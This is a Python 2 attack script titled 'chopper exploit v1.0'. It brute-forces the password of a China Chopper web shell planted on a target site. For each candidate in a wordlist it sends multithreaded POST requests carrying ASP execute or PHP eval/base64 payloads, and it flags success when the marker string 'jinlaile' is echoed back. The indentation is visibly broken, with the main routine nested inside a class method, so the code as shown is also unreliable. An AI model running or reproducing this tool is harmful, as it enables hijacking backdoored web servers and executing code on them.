#! /usr/bin/env python
#coding=utf-8

import re,threading,Queue,os,httplib
import msvcrt
import gzip,StringIO

print '''
#######################################################
#                                                     #
#               chopper exploit v1.0                  #
#            BY haxsscker#c0deplay.com                #
#                  team.f4ck.net                      #
#                                                      #
#######################################################
'''

class chopper(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.conn = httplib.HTTPConnection(ztarget)
	def run(self):
		while 1:
			if queue.empty()== True:
				self.conn.close()
				break
		self.expcp()
	def expcp(self):
		self.password = str(queue.get())
		print "testing--->"+self.password
		self.params = self.password+params
		try:
			self.conn.request(method="POST",url=target,body=self.params,headers=headers)
			self.response = self.conn.getresponse()
			if ('content-encoding', 'gzip') in self.response.getheaders():
				self.compressedstream = StringIO.StringIO(self.response.read())
				self.gzipper = self.gzip.GzipFile(fileobj=self.compressedstream)
				self.data = self.gzipper.read()
			else:
				self.data = self.response.read()
				if(self.data.find("jinlaile") >= 0):
					print "\n!!!!----PASS FIND!!! -------------->"+self.password
					os._exit(1)
		except Exception,e:
			print e
			pass

class ThreadGetKey(threading.Thread):
	def run(self):
		try:
			chr = msvcrt.getch()
			if chr == 'q':
			print "stopped by your action ( q )"
			os._exit(1)
		except:
			os._exit(1)

		if __name__ == "__main__":
			threads = []
			target = raw_input("target : http://www.xxx.com/1.asp ?  ")
			password = raw_input("password path: c:/password.txt ?  ")
			ext = raw_input("choice php/asp/aspx? : (asp) ")
			if ext == '':
				ext = "asp"
			if ext == "asp":
				params = "=execute(\"response.clear:response.write(\"\"jinlaile\"\"):response.end\")"
			elif ext == "php":
				params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
			else:
				params = "=Response.Clear();Response.Write(\"jinlaile\");"

		line = raw_input("lines(speed) : 5 ?  ")
		if line == '':
			line = 5
		try:
			line = int(line)
		except Exception, Error1:
			print "please enter a number....3Q"
			os._exit(1)

		passwordlist = []
		if password == '':
			password = "c:/password.txt"
		try:
			fp = open(password)
		except Exception, Error1:
			print "Files fopen Error"
			os._exit(1)
		queue = Queue.Queue()
		for password1 in fp.readlines():
			queue.put(password1.split('\n')[0])
		fp.close()

		pattern = re.compile('http:*')
		match = pattern.search(target)
		if(match):
			print "starting..."+ext
			ztarget = target.replace("http://","").split('/')[0]
			headers={"Host": ztarget,\
			"User-Agent": "Mozilla/5.0",\
			"Content-Type": "application/x-www-form-urlencoded",\
			"Referer": "http://"+ztarget
			}
		else:
			print "please enter an address....For exp: http://www.xxx.com/1.asp"
			os._exit(1)

		shouhu = ThreadGetKey()
		shouhu.setDaemon(True)
		shouhu.start()
		for i in range(line):
			a = chopper()
			a.start()
			threads.append(a)
		for j in threads:
			j.join()
